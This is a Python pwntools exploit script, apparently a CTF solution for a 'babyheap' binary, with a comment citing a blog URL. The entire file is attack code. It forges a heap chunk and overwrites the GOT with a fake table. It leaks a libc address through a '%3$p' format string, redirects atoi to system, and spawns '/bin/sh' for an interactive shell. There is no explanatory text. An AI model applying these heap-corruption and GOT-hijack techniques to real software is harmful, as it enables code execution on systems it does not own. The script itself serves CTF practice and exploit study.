# http://nextline.tistory.com/139
from pwn import *

s = process('./babyheap')

exit_got = 0x602020
atoi_got = 0x602078
ret = 0x400711

def new(size, content, name):
	s.recvuntil(':')
	s.sendline('1')
	s.recvuntil(':')
	s.sendline(size)
	s.recvuntil(':')
	s.sendline(content)
	s.recvuntil(':')
	s.sendline(name)

def delete():
	s.recvuntil(':')
	s.sendline('2')

def edit(content):
	s.recvuntil(':')
	s.sendline('3')
	s.recvuntil(':')
	s.sendline(content)

def exit(content):
	s.recvuntil(':')
	s.sendline('4')
	s.recvuntil('n)')
	s.sendline(content)

chunk_1  = 'n' + "\x00" * (0x1000 - 0x8 - 0x1 - 0x10) + p64(0x61)

exit(chunk_1)
payload = p64(0) * 3 + p64(0x61)
new(str(0x58), payload, "BBBBBBBB")
s.recvuntil(':')
delete()

payload = "AAAAAAAA" * 6 + p64(exit_got)
new(str(0x58), payload,"C")

fake_got = p64(ret) # exit
fake_got += p64(0x400750 + 0x6) # read_chk
fake_got += p64(0x400760 + 0x6) # puts
fake_got += p64(0x400770 + 0x6) # stack_chk_fail
fake_got += p64(0x400780 + 0x6) # printf
fake_got += p64(0x400790 + 0x6) # alarm
fake_got += p64(0x4007A0 + 0x6) # read
fake_got += p64(0x4007B0 + 0x6) # libc_start_main
fake_got += p64(0x4007C0 + 0x6) # signal
fake_got += p64(0x4007D0 + 0x6) # malloc
fake_got += p64(0x4007E0 + 0x6) # setvbuf
fake_got += p64(0x400780 + 0x6) # atoi

edit(fake_got)
s.recvuntil(':')
s.sendline("%3$p")
libc_base = int(s.recv(14)[2:],16) - 1141164
system = libc_base + 0x45390
print hex(system)

s.recvuntil(':')
s.sendline("%3$s")
fake_got = fake_got[:-8]
fake_got += p64(system)
s.sendline(fake_got)
s.recvuntil(':')
s.sendline("/bin/sh\x00")

s.interactive()
